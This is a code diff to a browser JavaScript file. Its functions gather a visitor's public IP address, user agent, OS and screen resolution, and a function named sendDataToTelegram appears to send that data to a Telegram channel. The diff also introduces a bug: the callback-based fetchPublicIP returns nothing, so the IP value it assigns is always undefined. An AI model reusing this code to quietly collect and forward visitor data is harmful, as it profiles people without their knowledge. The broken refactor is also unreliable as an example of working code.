@@ -25,6 +25,12 @@ async function getIPAddress() {
     return data.ip;
 }
 
+function fetchPublicIP(callback) {
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => callback(null, data.ip))
+    .catch(error => callback(error, null));
+}
 function getUserAgent() {
     return navigator.userAgent;
 }
@@ -49,9 +55,21 @@ function getBrowserInfo() {
         engine: navigator.product
     };
 }
-
+fetchPublicIP((error, ip) => {
+  if (error) {
+    console.error('Error retrieving IP address:', error);
+  } else {
+    console.log('Public IP address retrieved:', ip);
+  }
+});
 async function sendDataToTelegram() {
-    const ipAddress = await getIPAddress();
+    const ipAddress = fetchPublicIP((error, ip) => {
+      if (error) {
+        console.error('Error retrieving IP address:', error);
+      } else {
+        console.log('Public IP address retrieved:', ip);
+      }
+    });
     const userAgent = getUserAgent();
     const osName = getOSName();
     const screenResolution = getScreenResolution();
